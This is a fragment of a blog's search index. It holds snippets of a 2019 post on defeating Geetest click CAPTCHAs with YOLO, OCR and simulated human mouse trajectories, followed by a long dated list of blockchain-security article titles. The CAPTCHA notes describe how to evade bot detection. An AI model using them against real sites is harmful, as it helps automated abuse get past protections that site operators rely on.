","date":"2019-01-04","objectID":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html:2:2","tags":["Geetest","DeepLearning"],"title":"深度学习识别汉字点选验证码","uri":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html"},{"categories":["Spider"],"content":"yolo训练 坑6：过拟合！loss稳定即可结束，否则过拟合造成结果失真。 ","date":"2019-01-04","objectID":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html:2:3","tags":["Geetest","DeepLearning"],"title":"深度学习识别汉字点选验证码","uri":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html"},{"categories":["Spider"],"content":"语序识别 发现验证码图片底部会有正确语序 坑7：但多跑几个验证码发现底部汉字会有残缺情况，导致ocr识别少字或错字，增加ocr进行语序识别需修改破解含语序问题的点击验证码中语序识别算法。100张准确率可提升至90%，识别速度大幅降低。 ","date":"2019-01-04","objectID":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html:2:4","tags":["Geetest","DeepLearning"],"title":"深度学习识别汉字点选验证码","uri":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html"},{"categories":["Spider"],"content":"模拟点击 坑8：使用selenium的ActionChains进行模拟点击发现正确点选确定后验证失败，应该是极验进行了轨道判断，需要模拟人工滑动轨迹后点击。从100%失败的直接点击到30%成功的折线轨迹最后进化到99%成功easing轨迹。 ","date":"2019-01-04","objectID":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html:2:5","tags":["Geetest","DeepLearning"],"title":"深度学习识别汉字点选验证码","uri":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html"},{"categories":["Spider"],"content":"重要目录说明 darknet jiyan # 定位 jiyan_classify # 分类 python # 破解 gxst # 爬虫 cfg # 配置文件 weights # 权重 ","date":"2019-01-04","objectID":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html:3:0","tags":["Geetest","DeepLearning"],"title":"深度学习识别汉字点选验证码","uri":"/posts/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%86%E5%88%AB%E6%B1%89%E5%AD%97%E7%82%B9%E9%80%89%E9%AA%8C%E8%AF%81%E7%A0%81.html"},{"categories":["区块链"],"content":" 环境: spider(docker) : scrapy + postgresql auto(vps) : script(python2markdown \u0026 bash2workflow) + travis2hexo ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:0:0","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"New Articles ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:1:0","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2019-01-03 区块链安全—整数溢出原理分析 EOS竞猜游戏ggeos昨晚遭交易回滚攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:1:1","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"Old Articles ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:0","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-29 PeckShield: EOS竞猜游戏LuckBet今晨遭交易回滚攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:1","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-28 EOS 回滚攻击手法分析之重放篇 攻击BetDice的黑客团伙再现，竞猜游戏LuckyMe正遭攻击 PeckShield：EOS竞猜游戏GameBet遭受交易回滚攻击 针对Electrum钱包的钓鱼攻击，损失已高达100万美元 以太坊Fountain代币遭溢出攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:2","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-26 区块链安全—随机数安全分析（上） EOS 回滚攻击手法分析之黑名单篇 PeckShield：EOS竞猜游戏Lucky Nuts因随机数安全问题暂停 区块链安全—随机数安全分析（下） ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:3","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-25 Bitcoin Private（BTCP） 的案例研究 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:4","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-24 PeckShield安全播报: EOS竞猜游戏EosDice遭受交易回滚攻击 PeckShield安全播报：EOS竞猜游戏Pickown遭“假转账通知”攻击 PeckShield 安全播报: EOS竞猜游戏LuckBet遭随机数攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:5","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-20 EOS DApp 攻击重现之利用黑名单账号进行欺骗攻击 区块链安全—简单函数的危险漏洞分析（一） ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:6","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-19 BetDice遭黑客攻击，损失近20万EOS ToBet遭到黑客恶意攻击 Big.game也疑似遭遇黑客攻击 PeckShield安全：EOS竞猜游戏EOS MAX遭黑客攻击，损失55526个EOS PeckShield 安全播报: EOS竞猜游戏TRUSTBET遭黑客攻击，损失11501个EOS ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:7","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-18 竞猜类游戏Fastwin遭黑客攻击背后：Block.one官方悄然做了重大更新 区块链安全—合约存储机制安全分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:8","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-14 公链安全之比特币首个远程DoS漏洞详解(CVE-2010-5137) ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:9","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-12 基于EOS的ETH锚定币EETH遭假币攻击，目前接近归零！ PeckShield：今晨多款EOS竞猜类游戏遭黑客交易回滚攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:10","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-10 EOS智能合约常见漏洞实践 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:11","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-07 Ethereum Smart Contract Audit CheckList 公链安全之亦来云多个远程DoS漏洞详解 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:12","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-06 诈骗疯狂敛财！币安刚发布推出去中心化交易平台新闻，就有人仿冒！？ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:13","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-05 EOS竞猜游戏Fastwin遭黑客攻击 损失1929.17个EOS ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:14","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-04 VTC币(Vertcoin)遭受51％攻击，造成15次双花 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:15","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-12-03 Bctf Blockchain 两则详解——带你玩转区块链 Dice3D遭攻击后续分析：损失10569个EOS 和EOS.WIN遭受的攻击类似 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:16","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-28 PeckShield 安全播报: EOS竞猜类游戏nutsgambling遭黑客交易回滚攻击 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:17","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-27 千万下载量开源软件托管给陌生人 植入恶意代码窃取用户密币 区块链安全—详谈合约攻击（五） 黑客向热门 JavaScript 库注入恶意代码 窃取 Copay 钱包的比特币 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:18","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-23 团伙利用假充值漏洞非法获取比特币、以太币被批捕 区块链安全—详谈合约攻击（四） ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:19","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-22 Gas(矿工费)滥用漏洞的最新披露 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:20","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-21 区块链安全—详谈合约攻击（三） 以太坊EVM动态数组越界导致OOM分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:21","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-20 区块链安全—详谈合约攻击（二） 区块链安全—详谈合约攻击（一） LCTF2018 ggbank 薅羊毛实战 第三方代发空投平台 AirDropsDAC 的合约私钥泄露导致 HVT token 被盗 介绍如何使用 mythril-classic 查找并利用智能合约中的漏洞 某交易平台系统存在高危漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:22","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-19 条条大路通罗马：实现数字货币双花攻击的多种方法 条条大路通罗马——实现数字货币双花攻击的多种方法 安全监测: 竞猜游戏EOS Lelego疑遭黑客攻击 已暂停运营 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:23","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-16 PeckShield安全播报: EOS竞猜游戏LuckyGo遭黑客攻击，损失1029个EOS 区块链安全—详谈共识攻击（四） 以太坊合约审计 CheckList 之变量覆盖问题 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:24","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-15 BitcoinCore CVE-2018-17144漏洞研究与分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:25","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-14 区块链安全—详谈共识攻击（三） 【漏洞预警】警惕矿工费滥用攻击！ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:26","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-13 黑客接管Twitter认证账户，以Elon Musk名义推广虚假加密货币赠品 BCH的51攻击与防守 AurumCoin遭51%攻击，致使Cryptopia交易所损失约1.1万美元 去中心化交易所Newdex混入10亿个EOS假币，损失5.8万美元 EOS BET账户RAM被合约恶意吞噬 BitcoinCore CVE-2018-17144 漏洞研究与分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:27","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-12 【慢雾情报】 EOS 生态中的另外一个 DApp EOS.WIN也被攻破 【慢雾预警】知名 DApp EOSDice 由于随机数问题再次被黑 HCTF2018 智能合约两则 Writeup 以太坊智能合约审计 CheckList 比特大陆因黑客损失价值550万美元的比特币 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:28","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-09 以太坊再现重大漏洞？Netta杨子江表示，若被利用危害程度可能超过“The DAO” 从一起“盗币”事件看以太坊存储 hash 碰撞问题 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:29","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-08 EOS智能合约FFgame遭攻击，丢失1331个EOS ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:30","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-07 记SECCON 2018的一道智能合约题目 对加密货币交易所gate.io的供应链攻击 技术|“狩零人”威胁攻击分析报告！ 地球OL真实盗币游戏，Web题WriteUp ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:31","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-06 地球OL真实盗币游戏，挑战2万大奖！ IBM以区块链驱动的AR游戏系统存在严重缺陷 区块链安全—详谈共识攻击（二） ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:32","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-11-05 Google Play中用于加密登录凭据的“Easy Rates Converter”涉嫌网络钓鱼诈骗 11名黑客窃取价值8万美元的加密货币被捕 交易所漏洞之薅羊毛分析 区块链安全—详谈共识攻击（一） EOS开源游戏EOSDice被盗2545个EOS ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:33","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-26 Reddit用户价值约86万美元的加密货币被窃取 区块链安全—分析P2P网络攻击及密码学解决方案 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:34","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-23 挖矿攻击之time warp attack 白帽研究人员在网上直播了针对Bitcoin Private的51%攻击 区块链安全—区块链P2P网络详细分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:35","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-22 报告：加密货币交易所两年内因黑客攻击损失了8.82亿美元 瑞士区块链公司被盗5000万TIO 区块链安全—白话parity多签名合约漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:36","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-19 智能合约逆向初探 区块链的那些事—安全守卫者“哈希函数”的详细分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:37","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-18 智能合约游戏之殇——Dice2win安全分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:38","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-17 基于EOS开发的World Conquest被黑客攻击 被盗资金已经转入火币 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:39","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-16 区块链的那些事—THE DAO攻击事件源码分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:40","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-15 区块链的那些事—论激励机制与激励层中的Race-To-Empty攻击 EOS DApp 充值“假通知”漏洞分析 EOSBET遭受溢出攻击，损失巨额EOS DoraHacks区块链安全Hackathon 部分write up by 天枢 EOSBet遭“伪造转账通知”，损失近14万EOS，价值超500万元 黑客攻击成人网站窃取165枚ETH，归还后获奖5000美元 EOS“伪造转账通知”漏洞修复补丁 福利，DVP协助白帽子申请数个CVE！ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:41","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-14 Not a fair game, Dice2win公平性分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:42","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-13 矿池攻击了解一下 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:43","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-12 Not a fair game, Dice2win 公平性分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:44","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-11 Cobra：由于DDoS攻击Bitcoin.org关闭 剪贴板幽灵：币圈的神偷圣手 双11又又又来了？DVP双重活动，让你成为锦鲤本鲤 BPA出现和通胀漏洞（CVE-2018-17144），黑客超发1900万个BPA并在交易所套现 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:45","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-10 TheDAO悲剧重演，SpankChain重入漏洞分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:46","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-10-08 黑客用比特币代码漏洞生产出2.35亿个PGN代币，潜在风险或进一步扩大 柚资银行被盗1.8W个EOS 那些被黑客盗取的加密货币 是如何销赃的？ 从 Ethernaut 看以太坊智能合约漏洞（一） 苹果下架 EOSIO Wallet Explorer 数字货币钱包应用：盗取其他用户财产 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:47","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-30 利用随机数冲突的ECDSA签名恢复以太坊私钥 某个加密货币交易所的“生钱”漏洞 智能合约自动化审计技术浅析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:48","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-28 管中窥豹，从DVP数据看中心化交易所的安全现状 慢雾安全海贼王：从DApp亡灵军团，细说区块链安全 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:49","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-26 Fomo3D 二轮大奖开出，黑客获奖，机制漏洞成游戏没落主因 Crowd Machine团队遭黑客攻击 10亿CMCT被盗 EOS持仓大户被盗EOS目前确认为212万个 一份门罗币“销毁”漏洞的分析报告 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:50","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-25 漏洞预警 | CVE-2018-17144：Bitcoin Core通胀漏洞修复 Security Innovation Blockchain CTF writeup Blockchain can be Blocked（比特币网络通讯底层漏洞详解） Blockwell.ai KYC Casper Token “Psoriasis Advertising” Event Analysis ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:51","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-21 NEO dBFT 共识机制分析与完善 合约变量的“皇帝新衣” |成都链安漏洞分析连载第九期 ——外部读取状态变量 以太坊合约审计 CheckList 之“以太坊智能合约编码设计问题”影响分析报告 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:52","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-20 NEO dBFT共识机制分析与完善 日本加密货币交易所Zaif遭黑客攻击，损失约6000万美元 比特币惊现拒绝服务漏洞，Bitcoin Core开发者已发布紧急修复客户端 etherscan点击劫持漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:53","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-19 DVP已确认众多交易所存在TradingView漏洞，交易所需要立即升级！ 慢雾区： ⼀个通杀绝⼤多数交易平台的 XSS 0day 漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:54","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-17 关于假EOS刷币事件的公告 EOS DApp 已成黑客提款机？慢雾安全团队支招 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:55","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-15 数字货币交易平台面临着哪些安全威胁？ ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:56","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-14 ERC20事务顺序依赖性问题简要分析 BET被黑客攻击始末，实锤还原作案现场和攻击手段 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:57","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-13 blockwell.ai KYC Casper Token “牛皮癣广告” 事件分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:58","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-11 游戏合约Gorgona存在后门 owner可卷走所有资金 遗忘的亚特兰蒂斯：以太坊短地址攻击详解 DVP社区自治计划1.0出炉，邀你一起构建安全生态 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:59","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-06 以太坊合约审计 CheckList 之“以太坊智能合约编码安全问题”影响分析报告 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:60","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-05 Chrome扩展MEGA遭到破坏，用户的门罗币可能会被窃取 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:61","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-09-04 谷歌发布了用于探测以太坊区块链的工具 以太坊智能合约 OPCODE 逆向之调试器篇 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:62","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-31 迈克菲力挺的Bitfi钱包已承认安全问题 下周公布漏洞奖励方案 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:63","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-30 Pandemica庞氏游戏存在Gas超出漏洞，80余万资金遭冻结 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:64","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-28 安全状况、风险详情将透明 DVP平台推出安全红黑榜 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:65","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-27 Atlas Quantum加密货币投资平台遭遇数据泄露 Scavenging Attacks in “Post-Smuggling Era” ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:66","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-25 God.Game 智能合约攻击事件分析 以太坊智能合约多个攻击案例分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:67","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-24 Last Winner的最后赢家：智能合约超大规模黑客攻击手法曝光 God.Game 漏洞复盘：跑路还是黑客攻击？ 智能合约游戏之殇——类 Fomo3D 攻击分析 智能合约游戏之殇——GodGame 事件分析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:68","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-23 游戏skr而止，漏洞周而复始 | 成都链安漏洞分析连载第六期 —— 游戏合约漏洞全面汇总 Fomo3D 千万大奖获得者“特殊攻击技巧”最全揭露 GodGame漏洞原理以及黑客攻击手法分析 Fomo3D，被黑客拿走的2200万 白帽汇安全研究院：部分区块链厂商安全意识薄弱 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:69","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-22 游戏平台God.Game称遭黑客攻击，智能合约中以太坊总量归零 安比实验室：Fomo3D胜者采取“特殊技巧”加速游戏结束并提高胜率 以太坊合约审计 CheckList 之“以太坊智能合约设计缺陷问题”影响分析报告 SABRE保护比特币免受路由攻击(Paper) BitMEX交易所遭遇DDOS，目前已经恢复 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:70","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-20 以太坊 “后偷渡时代” 盗币之 “拾荒攻击” ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:71","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-19 neo智能合约平台Runtime_Serialize调用拒绝服务漏洞 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:72","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-18 一种利用 etherscan.io 缺陷的智能合约蜜罐 “Ethereum Smart Contract Specification Issue” Impact Analysis 智能合约史上最大规模攻击手法曝光，盘点黑客团伙作案细节 一种针对类 Fomo3D 游戏空投的高级攻击技术剖析 ","date":"2019-01-03","objectID":"/posts/blockchain-security-articles.html:2:73","tags":["BlockChain"],"title":"Blockchain Security Articles","uri":"/posts/blockchain-security-articles.html"},{"categories":["区块链"],"content":"2018-08-17 1200W人民币被盗！区块链游戏Last Winner疑点重重 